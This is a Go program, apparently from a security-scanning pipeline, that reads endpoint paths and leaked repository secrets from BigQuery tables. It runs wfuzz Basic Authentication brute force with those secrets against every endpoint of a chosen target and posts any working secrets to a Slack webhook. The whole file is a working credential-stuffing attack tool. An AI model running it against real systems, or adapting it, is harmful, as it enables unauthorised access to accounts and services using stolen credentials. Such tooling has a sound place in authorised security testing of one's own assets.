// WFUZZ Basic Authentication Bruteforcer
// for the wfuzz table supplied by the env, retrieve all the endpoints
// for the reposupervisor table supplied by the env, retrieve all the secrets
// for each endpoint, try wfuzz bruteforce for all secrets against that endpoint and store all 200 and 403 status responses
// once everything is done, send back the response to slack if file exists and >0 and slack webhook url is provided

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"

	"google.golang.org/api/iterator"

	"cloud.google.com/go/bigquery"
)

var endpoints []string //for wfuzz request endpoints

type error interface {
	Error() string
}

var (
	projectID       string
	rsDS            string
	rsT             string
	wfDS            string
	wfT             string
	url             string
	slackHook       = flag.String("slackHook", "", "An incoming webhook for Slack to send the results")
	isHTTPS         = flag.Bool("isHTTPS", false, "Is the target accessible over HTTPS? Default is 0")
	target          = flag.String("target", "", "Target to run wfuzz basic authN bruteforce against")
	username        = flag.String("username", "admin", "Username to bruteforce the basic authentication against")
	tmpFilePath     = "/tmp/out.csv"
	tmpPassListPath = "/tmp/pass.txt"
)

//exists function to see if a file exists
func exists(path string) (bool, int64, error) {
	fi, err := os.Stat(path)
	if err == nil {
		return true, fi.Size(), nil
	}
	if os.IsNotExist(err) {
		return false, int64(0), nil
	}
	return false, int64(0), err
}

//CheckIfError function to check for errors
func CheckIfError(err error) {
	if err == nil {
		return
	}

	fmt.Printf("\x1b[31;1m%s\x1b[0m\n", fmt.Sprintf("error: %s", err))
	os.Exit(1)
}

//Info function to print pretty output
func Info(format string, args ...interface{}) {
	fmt.Printf("\x1b[34;1m%s\x1b[0m\n", fmt.Sprintf(format, args...))
}

func main() {

	//Loading the environment variables
	//  err := gotenv.Load(".env")
	//  if err != nil {
	//  	log.Fatal("Error loading .env file")
	//  }

	flag.Parse()

	projectID = os.Getenv("PROJECT_ID")
	rsDS = os.Getenv("RS_DATASET_NAME")
	rsT = os.Getenv("RS_TABLE_NAME")
	wfDS = os.Getenv("WF_DATASET_NAME")
	wfT = os.Getenv("WF_TABLE_NAME")

	//by default, it is https
	switch *isHTTPS {
	case true:
		url = "https://" + *target + "/"
	case false:
		url = "http://" + *target + "/"
	}

	// instantiating the BQ client
	ctx := context.Background()
	bqclient, err := bigquery.NewClient(ctx, projectID)
	CheckIfError(err)

	// retrieving all the endpoints from wfuzz table for that target
	wfquery := bqclient.Query("SELECT Request FROM `" + projectID + "." + wfDS + "." + wfT + "` Where Request IS NOT null GROUP BY Request")
	it1, err := wfquery.Read(ctx)
	CheckIfError(err)

	// loop through the endpoints and append it to the endpoints string array
	for {
		var values []bigquery.Value
		err = it1.Next(&values)
		if err == iterator.Done {
			break
		} else if err != nil {
			fmt.Println("Error iterating over results " + err.Error())
		}

		endpoints = append(endpoints, values[0].(string))

	}

	// retrieving all the secrets from repo supervisor table for that target
	rsquery := bqclient.Query("SELECT Secret FROM `" + projectID + "." + rsDS + "." + rsT + "` Where Secret IS NOT null GROUP BY Secret")
	it2, err := rsquery.Read(ctx)
	CheckIfError(err)

	// instantiating a file to store all the secrets
	secretsFile, err := os.Create(tmpPassListPath)
	CheckIfError(err)
	defer secretsFile.Close()

	// loop through the secrets and write it to /tmp/pass.txt file
	for {
		var values []bigquery.Value
		err = it2.Next(&values)
		if err == iterator.Done {
			break
		} else if err != nil {
			fmt.Println("Error iterating over results " + err.Error())
		}
		_, err = secretsFile.WriteString(values[0].(string) + "\n")
		CheckIfError(err)
	}

	// instantiating a temp file to store the bruteforcing results
	bruteforcedFile, err := os.Create(tmpFilePath)
	CheckIfError(err)
	defer bruteforcedFile.Close()
	bruteforcedFile.WriteString("endpoint,response,secret\n") //this file will have 3 columns

	// iterate through all the endpoints and run wfuzz basic authN bruteforce against each one of them with the pass.txt file
	// store all the results in the file created above
	for _, el := range endpoints {
		Info("URL: " + url + el)
		cmd := exec.Command("python", "wfuzz/wfuzz.py", "-w", tmpPassListPath, "-o", "csv", "--basic", *username+":FUZZ", "--sc", "200,403", url+el)
		var out bytes.Buffer
		cmd.Stdout = &out
		err := cmd.Run()
		CheckIfError(err)

		currString := out.String()
		validString := strings.TrimSpace(strings.Split(currString, "id,response,lines,word,chars,request,success")[1])

		if validString != "" {
			respCode := strings.Split(validString, ",")[1]
			secretValue := strings.Split(validString, ",")[5]
			endP := el
			bruteforcedFile.WriteString(endP + "," + respCode + "," + secretValue + "\n")
		}

	}

	value := false
	fsize := int64(0)

	//checking for file existence and file size
	for (value == false) || (fsize == int64(0)) {
		i, s, err := exists(tmpFilePath)
		CheckIfError(err)
		value = i
		fsize = s
	}

	// if the slack hook URL is provided
	if *slackHook != "" {
		//send the output to slack
		data, err := ioutil.ReadFile(tmpFilePath)
		CheckIfError(err)

		jval := "*" + "Output from: WFUZZ Basic AuthN Bruteforcer" + "*" + "\n" + "```" + string(data) + "```"

		jsonstr := map[string]string{"text": jval}
		jsonValue, _ := json.Marshal(jsonstr)

		body := strings.NewReader(string(jsonValue))

		req, err := http.NewRequest("POST", *slackHook, body)
		CheckIfError(err)
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		CheckIfError(err)
		defer resp.Body.Close()

		if resp.Status == "200 OK" {
			fmt.Println("Message sent to Slack!")
		}
	}

	fmt.Println("Done")

}
